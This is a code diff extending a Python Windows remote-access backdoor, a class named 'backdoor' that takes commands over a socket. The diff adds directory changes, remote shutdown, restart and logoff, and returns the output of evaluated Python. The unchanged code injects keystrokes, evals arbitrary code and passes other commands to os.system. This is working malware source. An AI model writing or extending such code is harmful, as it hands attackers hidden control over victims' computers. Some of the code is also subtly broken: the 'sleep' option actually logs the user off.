@@ -1,4 +1,4 @@
-import sqlite3,socket,os,time,datetime,keyboard,winreg
+import sqlite3,socket,os,time,datetime,keyboard,winreg,subprocess
 
 class backdoor:
     def __init__(self):
@@ -49,6 +49,7 @@ class backdoor:
         output = ""
         commands_to_execute = code.split("\r\n")
         lines_to_skip = []
+
         for line, command in enumerate(commands_to_execute):
             if line in lines_to_skip: continue
             if command.startswith("read"):
@@ -77,10 +78,32 @@ class backdoor:
                         continue
                     
                     keyboard.write(commands_to_execute[i+line])
+            elif command.startswith("cd"):
+                directory_to_change = command.split(" ")[1]
+                os.chdir(directory_to_change)
+                output += os.system("cd")
             elif command.startswith("delay"):
                 delay_command = command.split("(")
                 time_to_delay = delay_command[1].replace(")", "")
                 time.sleep(float(time_to_delay))
+            elif command.startswith("power"):
+                power_command = command.split("(")
+                power_command_argument = power_command[1].replace(")", "")
+                power_command_argument = power_command_argument.replace('"', '')
+                power_command_argument = power_command_argument.replace("'", "")
+                if power_command_argument.lower() == "shutdown":
+                    os.system("shutdown /p")
+                    output += "Shutting down the pc"
+                    continue
+                elif power_command_argument.lower() == "restart":
+                    os.system("shutdown /r")
+                    output += "Restarting the pc"
+                    continue
+                elif power_command_argument.lower() == "sleep":
+                    os.system("shutdown /l")
+                    output += "Computer is going on sleep"
+                    continue
+                output += power_command_argument + " is a invalid argument, (shutdown, restart, sleep)"
             elif command.startswith("python"):
                 python_code = ""
                 for i in range(1, len(commands_to_execute)):
@@ -90,7 +113,7 @@ class backdoor:
                     
                     python_code += commands_to_execute[i+line] + "\n"
                 
-                eval(python_code)
+                output += eval(python_code)
 
             else:
                 os.system(command)
